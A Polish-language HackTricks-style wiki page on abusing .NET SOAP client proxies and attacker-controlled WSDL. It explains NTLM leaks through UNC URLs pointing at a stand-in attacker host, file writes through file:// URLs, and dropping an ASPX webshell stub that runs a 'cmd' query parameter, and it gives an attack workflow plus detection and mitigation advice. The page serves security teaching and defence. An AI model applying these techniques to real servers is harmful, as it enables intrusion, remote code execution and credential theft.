# .NET SOAP/WSDL — nadużycie proxy klienta

{{#include ../../banners/hacktricks-training.md}}

## W skrócie

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` i podobne dziedziczą po `HttpWebClientProtocol`, którego `GetWebRequest()` zwraca schemowo-agnostyczną instancję `WebRequest` utworzoną przez `WebRequest.Create()` bez wymuszania `HttpWebRequest`.
- Jeśli atakujący kontroluje `Url` proxy, framework cicho podstawia `FileWebRequest`, `FtpWebRequest` lub handlery UNC/SMB, zamieniając "HTTP" proxy w gadżety wycieków NTLM lub w arbitralne zapisujące pliki.
- Każda funkcja, która importuje dostarczony przez atakującego WSDL za pomocą `ServiceDescriptionImporter`, potęguje błąd: WSDL kontroluje generowany konstruktor proxy, metody SOAP, typy złożone i przestrzenie nazw, umożliwiając pre-auth RCE (webshelle, zrzuty skryptów) w produktach takich jak Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell i SSIS.

## Przyczyna źródłowa: HttpWebClientProtocol jest schemowo-agnostyczny

`WebClientProtocol.GetWebRequest()` robi `var req = WebRequest.Create(uri)` i zwraca go bez zmian. `HttpWebClientProtocol.GetWebRequest()` próbuje `req as HttpWebRequest`, aby ustawić pola tylko dla HTTP, ale **nadal zwraca oryginalny `req`** nawet jeśli rzutowanie się nie powiedzie. Wykonanie zatem stosuje się do schematu obecnego w `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` lub `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` następnie przesyła ciało POST SOAP przez wybrany handler transportu, nawet jeśli oznacza to zapis na dysk lub przez SMB.

## Primitiv 1 – przechwytywanie / relay NTLM przez cele UNC

1. Uzyskaj kontrolę nad `SoapHttpClientProtocol.Url` (bezpośredni setter, wartość w konfiguracji, wiersz w bazie danych itp.).
2. Wskaż go na ścieżkę UNC jak `file://attacker.local/sink/payload`.
3. CLR otwiera ścieżkę przez SMB i wykonuje uwierzytelnianie zintegrowane, ujawniając challenge/response NTLM atakującemu.
4. Użyj przechwyconych hashy do crackowania offline lub NTLM relay (SMB/HTTP), jeśli podpisywanie/EPA nie są włączone.

To dotyczy **dowolnej** ścieżki proxy .NET SOAP/HTTP, która przyjmuje dane od użytkownika, nawet jeśli nie jest możliwa dalsza eskalacja.

## Primitiv 2 – arbitralne zapisy plików przez `file://`

1. Ustaw `Url = "file:///inetpub/wwwroot/poc.aspx"` (lub dowolną ścieżkę z prawem zapisu) przed wywołaniem proxy.
2. Wywołaj dowolną metodę SOAP; framework zapisze cały envelope SOAP do wybranej ścieżki, nadpisując istniejące pliki.
3. Argumenty kontrolowane przez użytkownika pojawiają się wewnątrz elementów XML, co pozwala atakującym upuścić payloady CSHTML/ASPX lub zatruć pliki konfiguracyjne.

Ograniczenia:

- Zawartość jest zawsze XML; pola skalarne są entity-enkodowane, więc wstrzyknięcie `<script>` przez zwykłe stringi wymaga dodatkowych sztuczek.
- Sensowne payloady wymagają przynajmniej jednego argumentu kontrolowanego przez atakującego lub możliwości modyfikacji sygnatury metody (zob. nadużycie WSDL).

Runtime często rzuca `Client found response content type of 'application/octet-stream', but expected 'text/xml'` po zapisie — traktuj ten błąd jako IOC.

## Uzbrajanie importu WSDL

### Auto-generowane proxy przez `ServiceDescriptionImporter`

Wiele produktów udostępnia funkcje "custom web service", które akceptują URL WSDL, a następnie:

1. `ServiceDescription.Read()` złośliwy, kontrolowany przez atakującego WSDL.
2. `ServiceDescriptionImporter` generuje klasy proxy w C# rozszerzające `SoapHttpClientProtocol`.
3. CodeDOM kompiluje proxy, a reflection wywołuje żądaną metodę.

Atakujący w pełni kontroluje:

- `soap:address` / `soap12:address` `location` → staje się `base.Url` (może ustawić `file://` lub ścieżki UNC).
- Nazwy metod, listy parametrów, typy złożone i serializatory.
- URI przestrzeni nazw, które trafiają jako atrybuty `xmlns:*` w każdej wiadomości SOAP.

Nie występuje walidacja schematu, więc każde wygenerowane proxy dziedziczy oryginalną wadę projektową.

### Kształtowanie envelope SOAP dla RCE

- Complex type serialization: Zdefiniuj niestandardowe struktury w WSDL tak, aby gdy `XmlSerializer` zserializuje je ponownie, wygenerowały elementy/atrybuty wybrane przez atakującego. Dla zrzutu webshella ASPX przygotuj typy, które serializują do:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
i ustaw `Url` na `file:///.../webroot/shell.aspx`, aby uzyskać RCE.
- Namespace injection: Nawet gdy argumenty są na stałe (np. Umbraco Forms), przestrzenie nazw deklarowane w WSDL (np. `xmlns:tns="http://host/service?x=@{...}"`) są kopiowane bez zmian do envelope SOAP. Osadzenie ładunków w query stringu przestrzeni nazw umożliwia zrzuty CSHTML Razor lub skryptów PowerShell bez kontroli parametrów.

Te techniki zasilały exploit przeciwko Barracuda Service Center RMM (CVE-2025-34392): nieautoryzowane wywołanie SOAP dostarczyło złośliwy WSDL, ustawiło `soap12:address` na `file:///Program Files/.../SCMessaging/poc.aspx`, wstrzyknęło `<script runat="server">` poprzez złożone parametry i wgrało webshell wykonujący dowolne komendy `cmd.exe`.

## Typowy workflow ataku

1. Zidentyfikuj funkcjonalność, która akceptuje URL WSDL lub pozwala użytkownikom konfigurować endpointy SOAP (np. Barracuda `InvokeRemoteMethod`, konektory Ivanti EPM, datasource'y Umbraco 8 Forms, PowerShell `New-WebServiceProxy`).
2. Hostuj złośliwy WSDL, którego `soap:address` wskazuje na ścieżkę z prawem zapisu lub udział UNC, a którego definicje schematu dostarczają metod/typów sprzyjających payloadom.
3. Wywołaj import/kompilację. Cel wygeneruje DLL proxy z konstruktorem i metodami kontrolowanymi przez atakującego.
4. Gdy aplikacja wywoła wygenerowaną metodę, żądanie SOAP zostanie zserializowane i zapisane do ścieżki wskazanej przez atakującego, osadzając payload.
5. Uruchom upuszczony plik (przejdź do `poc.aspx?cmd=whoami`, załaduj CSHTML albo pozwól PowerShell wykonać skrypt) lub odtwórz przechwycone materiały NTLM.

## Wykrywanie i polowanie

- Static analysis: Przeszukaj kod pod kątem `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol` lub `New-WebServiceProxy`. Śledź skąd pochodzą `Url` lub dane WSDL — wszystko kontrolowane przez użytkownika to czerwony flag.
- Runtime telemetry:
- Instrumentuj tworzenie proxy, aby logować schematy; alertuj na wartości `file`, `ftp` lub UNC.
- Monitoruj charakterystyczne błędy "Client found response content type of 'application/octet-stream'" po wywołaniach SOAP.
- Obserwuj nieoczekiwane zapisy `.aspx/.cshtml/.ps1` w katalogach aplikacji wykonywane przez tożsamość web service.
- Network/file signals: Połączenia SMB inicjowane przez serwery WWW do infrastruktury atakującego lub nagłe kompilacje tymczasowych DLLi proxy często poprzedzają eksploatację.

## Łagodzenia

- Wymuszaj walidację transportu przed wywołaniem jakiegokolwiek proxy pochodnego od `HttpWebClientProtocol`:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Sanityzuj importowany WSDL: pobieraj proxy przez broker, który przepisuje lub odrzuca wpisy `soap:address` nie-HTTP/S, usuwa nieznane bindings i zabrania sztuczek z przestrzeniami nazw.
- Wyłącz nieufane funkcje WSDL: Zamień "upload a WSDL" convenience na sprawdzone, serwerowe szablony lub allowlisty.
- Segreguj miejsca zapisu: Upewnij się, że app poole nie mogą zapisywać do katalogów wykonywalnych; używaj osobnych wolumenów dla danych i kodu, aby prymitywy zapisu plików nie stawały się RCE.
- Utwardź ekspozycję NTLM: Wyłącz wychodzące SMB tam, gdzie to możliwe; w przeciwnym razie wymuś SMB signing, EPA i inne mitigacje przeciw relay.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
